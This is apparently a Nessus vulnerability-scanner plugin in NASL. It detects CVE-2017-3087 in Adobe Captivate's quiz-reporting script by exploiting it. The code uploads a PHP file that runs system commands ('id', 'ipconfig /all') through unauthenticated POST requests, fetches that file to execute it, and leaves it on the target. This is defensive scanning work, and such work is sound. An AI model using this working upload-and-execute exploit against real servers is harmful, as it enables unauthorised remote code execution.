#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(100841);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/02/25");

  script_cve_id("CVE-2017-3087");
  script_xref(name:"IAVA", value:"2017-A-0172");

  script_name(english:"Adobe Captivate Quiz Reporting Feature 'internalServerReporting.php' File Upload RCE");
  script_summary(english:"Attempts to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Adobe Captivate application running on the remote web server is
affected by a remote code execution vulnerability in the quiz
reporting feature within the 'internalServerReporting.php' script due
to improper sanitization and verification of uploaded files before
placing them in a user-accessible path. An unauthenticated, remote
attacker can exploit this issue, by uploading and then making a direct
request to a crafted file, to execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/security/products/captivate/apsb17-19.html");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/captivate/kb/security-updates-captivate.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Adobe Captivate 2017 (10.0.0.192) or later. Alternatively,
apply the hotfix for Adobe Captivate 8 and 9.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-3087");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/06/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/06/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/06/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:captivate");
  script_set_attribute(attribute:"stig_severity", value:"II");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("os_fingerprint.nasl");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

app  = "Adobe Captivate Quiz Reporting";
port = get_http_port(default:80, php:TRUE);

# Verify that the affected file is running on the remote webserver
url  = "/internalServerReporting.php";

res = http_send_recv3(
  port            : port,
  method          : "GET",
  item            : url,
  exit_on_fail    : TRUE
);

# Simple detection before sending POST requests
if (
  # PHP warnings disabled
  res[2] != '<pre>\n</pre>\n' &&
  res[2] != '<pre>\nBad Param: name cannot be empty.\n' &&
  # PHP warnings enabled
  res[2] !~ "fopen.*/CaptivateResults/" &&
  res[2] !~ "Undefined variable: CompanyName in "
)
  audit(AUDIT_WEB_FILES_NOT, app, port);

install_url = build_url(port:port, qs:"/");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig%20/all';
  else cmd = 'id';

  cmds = [cmd];
}
else cmds = ['id', 'ipconfig%20/all'];

# Exploit attempt
cmd_pats = {};
cmd_pats['id']              = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig%20/all'] = "Windows IP Configuration|(Subnet Mask|IP(v(4|6))? Address)[\. ]*:";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime();
ext   = ".php";

req_num    = 0;
vuln       = FALSE;
attack     = NULL;
attack_req = NULL;

boundary = '-------------------------------';

foreach cmd (cmds)
{
  token += req_num;

  if (cmd == "id")
    attack = "<?php system('id');echo('path='); system('pwd');?>";
  else
    attack = '<?php echo(' + "'<pre>');system('ipconfig /all');system('dir " + token + ext + "');?>";

  postdata = "CompanyName=.&DepartmentName=.&CourseName=.&Filename="+ token + ext +"&Filedata=" + attack;

  # Attempt exploit
  res = http_send_recv3(
    method       : "POST",
    item         : "/internalServerReporting.php", 
    port         : port,
    data         : postdata,
    add_headers  : make_array("Content-Type", "application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );

  if (empty_or_null(res) || res[0] !~ "^HTTP/[0-9.]+ +200 ")
  {
    req_num++;
    continue;
  }

  # Try accessing the file we created
  file_path = "/CaptivateResults/" + token + ext;

  res = http_send_recv3(
    method       : "GET",
    item         : file_path,
    port         : port,
    exit_on_fail : TRUE
  );

  if (empty_or_null(res) || res[0] !~ "^HTTP/[0-9.]+ +200 ")
  {
    req_num++;
    continue;
  }

  output = res[2];
  if (pgrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    attack_req = http_last_sent_request();

    if (cmd == "id")
    {
      line_limit = 2;
      item = pregmatch(pattern:"path=(.*)", string:output);

      if (!empty_or_null(item))
      {
        path = chomp(item[1]) + '/' + token + ext;
        pos = stridx(output, "path=");
        if (!empty_or_null(pos))
          output = substr(output, 0, pos-1);
      }
      else path = 'unknown';
    }
    else
    {
      cmd = 'ipconfig /all'; #Format for report output
      line_limit = 10;
      output = strstr(output, "Windows IP");
      item = pregmatch(pattern:"Directory of (.*)", string:output);

      if (!empty_or_null(item))
      {
        path = chomp(item[1]) + '\\' + token + ext;
        pos = stridx(output, "Volume in drive");
        if (!empty_or_null(pos))
          output = substr(output, 0, pos - 1);
      }
      else path = 'unknown';
    }
    if (empty_or_null(output)) output = res[2]; # Just in case
    break;
  }
  # Increment file name before next request attempt
  else req_num++;
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  cmd         : cmd,
  line_limit  : line_limit,
  request     : make_list(attack_req, install_url + file_path),
  output      : chomp(output),
  rep_extra   : '\n' + 'Note: This file has not been removed by Nessus and will need to be' +
                '\n' + 'manually deleted (' + path + ').'
);
